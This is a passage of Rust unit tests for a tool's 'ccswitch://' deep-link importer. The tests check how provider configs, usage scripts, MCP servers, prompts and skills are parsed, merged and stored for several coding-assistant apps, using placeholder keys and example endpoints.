    assert_eq!(script.coding_plan_provider.as_deref(), Some("zhipu"));
}

#[test]
fn test_deeplink_coding_plan_never_replaces_a_carried_script() {
    let code = "export async function query() { return { cost: 0 }; }";
    let mut request = usage_script_request(code, None);
    request.endpoint = Some("https://api.kimi.com/coding/v1".to_string());
    let script = imported_usage_script(AppType::Claude, &request).unwrap();
    assert_eq!(script.code, code);
    assert_eq!(script.template_type, None);
}

#[test]
fn test_deeplink_volcengine_plan_is_preselected_but_off() {
    // 火山查额度要账号级 AccessKey，链接里没有：只预选套餐，不默认启用
    let request = coding_plan_request("opencode", "https://ark.cn-beijing.volces.com/api/plan/v3");
    let script = imported_usage_script(AppType::OpenCode, &request).unwrap();
    assert!(!script.enabled);
    assert_eq!(script.coding_plan_provider.as_deref(), Some("volcengine"));

    let mut request = coding_plan_request("claude", "https://ark.cn-beijing.volces.com/api/coding");
    request.usage_enabled = Some(true);
    let script = imported_usage_script(AppType::Claude, &request).unwrap();
    assert!(script.enabled, "usageEnabled=true 必须照办");
}

#[test]
fn test_deeplink_non_plan_and_zenmux_outside_claude_stay_off() {
    let request = coding_plan_request("claude", "https://api.example.com/v1");
    assert!(imported_usage_script(AppType::Claude, &request).is_none());

    let request = coding_plan_request("codex", "https://zenmux.ai/api/v1");
    assert!(imported_usage_script(AppType::Codex, &request).is_none());
    let request = coding_plan_request("claude", "https://zenmux.ai/api/anthropic");
    assert!(imported_usage_script(AppType::Claude, &request).is_some());
}

#[test]
fn agy_deeplink_provider_config_precedence_and_protocol() {
    let config = BASE64_URL_SAFE_NO_PAD.encode(serde_json::json!({
        "env": {"GEMINI_API_KEY": "fixture", "GOOGLE_GEMINI_BASE_URL": "https://relay.example", "GEMINI_MODEL": "env-model", "NODE_OPTIONS": "untrusted"},
        "config": {"model": {"name": "native-model"}, "unrelated": true}
    }).to_string());
    let url = format!("ccswitch://v1/import?resource=provider&app=agy&name=Test&config={config}&apiFormat=gemini_native");
    let request = parse_deeplink_url(&url).unwrap();
    let merged = parse_and_merge_config(&request).unwrap();
    assert_eq!(merged.model.as_deref(), Some("native-model"));
    assert_eq!(merged.api_key.as_deref(), Some("fixture"));
    let provider = super::provider::build_provider_from_request(&AppType::Agy, &merged).unwrap();
    assert_eq!(
        provider.settings_config["config"]["model"]["name"],
        "native-model"
    );
    assert!(provider.settings_config["env"]
        .get("NODE_OPTIONS")
        .is_none());
    assert!(provider.settings_config["config"]
        .get("unrelated")
        .is_none());
    let explicit = parse_deeplink_url(&format!(
        "{url}&model=url-model&apiKey=url-key&endpoint=https://explicit.example"
    ))
    .unwrap();
    let merged = parse_and_merge_config(&explicit).unwrap();
    assert_eq!(merged.model.as_deref(), Some("url-model"));
    assert_eq!(merged.api_key.as_deref(), Some("url-key"));
    assert_eq!(merged.endpoint.as_deref(), Some("https://explicit.example"));
    for format in ["anthropic", "openai_chat", "openai_responses"] {
        assert!(parse_deeplink_url(&format!(
            "ccswitch://v1/import?resource=provider&app=agy&name=Test&apiFormat={format}"
        ))
        .is_err());
    }
}

#[test]
fn agy_deeplink_accepts_flat_env_and_rejects_invalid_env() {
    for (config, valid) in [
        (
            serde_json::json!({"GEMINI_API_KEY":"fixture", "GEMINI_BASE_URL":"https://relay.example", "GEMINI_MODEL":"flat-model"}),
            true,
        ),
        (serde_json::json!({"env": []}), false),
    ] {
        let encoded = BASE64_URL_SAFE_NO_PAD.encode(config.to_string());
        let request = parse_deeplink_url(&format!(
            "ccswitch://v1/import?resource=provider&app=agy&name=Test&config={encoded}"
        ))
        .unwrap();
        let result = parse_and_merge_config(&request);
        assert_eq!(result.is_ok(), valid);
        if valid {
            let merged = result.unwrap();
            assert_eq!(merged.model.as_deref(), Some("flat-model"));
            assert_eq!(merged.endpoint.as_deref(), Some("https://relay.example"));
        }
    }
}

#[test]
#[serial_test::serial]
fn agy_deeplink_mcp_import_merges_apps_and_writes_native_config() {
    let _home = TestHomeGuard::new();
    let db = Arc::new(Database::memory().unwrap());
    let state = AppState::new(db.clone());
    let config = BASE64_URL_SAFE_NO_PAD
        .encode(r#"{"mcpServers":{"fixture":{"command":"echo","args":["fixture"]}}}"#);
    // First import belongs to another app, then the same ID is enabled for agy.
    for apps in ["codex", "agy"] {
        let request = parse_deeplink_url(&format!(
            "ccswitch://v1/import?resource=mcp&apps={apps}&config={config}"
        ))
        .unwrap();
        let result = super::mcp::import_mcp_from_deeplink(&state, request).unwrap();
        assert_eq!(result.imported_count, 1);
        assert!(result.failed.is_empty());
    }
    let rows = db.get_all_mcp_servers().unwrap();
    assert!(rows["fixture"].apps.agy && rows["fixture"].apps.codex);
    let native: serde_json::Value = serde_json::from_slice(
        &std::fs::read(crate::config::get_home_dir().join(".gemini/config/mcp_config.json"))
            .unwrap(),
    )
    .unwrap();
    assert_eq!(native["mcpServers"]["fixture"]["command"], "echo");
    assert!(parse_mcp_apps("agy,gemini").unwrap().agy);
    assert!(parse_mcp_apps("agy,invalid").is_err());
}

#[test]
#[serial_test::serial]
fn agy_deeplink_prompt_import_respects_activation() {
    let _home = TestHomeGuard::new();
    let state = AppState::new(Arc::new(Database::memory().unwrap()));
    let content = BASE64_URL_SAFE_NO_PAD.encode("Agy instructions");
    let path = crate::prompt_files::prompt_file_path(&AppType::Agy).unwrap();
    for enabled in [false, true] {
        let request = parse_deeplink_url(&format!("ccswitch://v1/import?resource=prompt&app=agy&name=Test-{enabled}&content={content}&enabled={enabled}")).unwrap();
        let id = import_prompt_from_deeplink(&state, request).unwrap();
        assert_eq!(
            state.db.get_prompts("agy").unwrap()[&id].content,
            "Agy instructions"
        );
        assert_eq!(path.exists(), enabled);
    }
    assert_eq!(std::fs::read_to_string(path).unwrap(), "Agy instructions");
    assert!(!crate::gemini_config::get_gemini_dir()
        .join("GEMINI.md")
        .exists());
}

#[test]
#[cfg(unix)]
#[serial_test::serial]
fn agy_deeplink_enabled_key_provider_stays_out_of_live_files() {
    let _home = TestHomeGuard::new();
    let state = AppState::new(Arc::new(Database::memory().unwrap()));
    let request = parse_deeplink_url("ccswitch://v1/import?resource=provider&app=agy&name=Agy&endpoint=https://relay.example&apiKey=fixture&model=link-model&enabled=true").unwrap();
    let id = super::provider::import_provider_from_deeplink(&state, request).unwrap();
    // Antigravity cards have no "enable": enabled=true only imports the card.
    let current = crate::mode::current::provider_for(
        &state.db,
        &AppType::Agy,
        crate::mode::current::Purpose::Direct,
    )
    .unwrap();
    assert_eq!(current, None);
    // A key card never creates or changes the native settings: it only applies
    // to agy started from "Open Terminal" with its private profile.
    assert!(!crate::agy_config::settings_path().exists());
    assert!(!crate::config::get_home_dir().join(".gemini/.env").exists());
    let row = state.db.get_provider_by_id(&id, "agy").unwrap().unwrap();
    let launch = crate::services::provider::agy_direct::terminal_launch(&row).unwrap();
    assert_eq!(
        launch.env[0],
        ("GEMINI_API_KEY", Some("fixture".to_string()))
    );
    let private: serde_json::Value = serde_json::from_slice(
        &std::fs::read(
            launch
                .gemini_dir
                .unwrap()
                .join("antigravity-cli/settings.json"),
        )
        .unwrap(),
    )
    .unwrap();
    assert_eq!(private["model"], "link-model");
    assert_eq!(private["modelProvider"], "gemini");
}

#[test]
fn skill_deeplink_is_a_shared_repository_not_an_agy_install() {
    let state = AppState::new(Arc::new(Database::memory().unwrap()));
    let request =
        parse_deeplink_url("ccswitch://v1/import?resource=skill&repo=example/skills&app=agy")
            .unwrap();
    assert!(request.app.is_none());
    assert_eq!(
        super::skill::import_skill_from_deeplink(&state, request).unwrap(),
        "example/skills"
    );
    assert!(state.db.get_all_installed_skills().unwrap().is_empty());
}
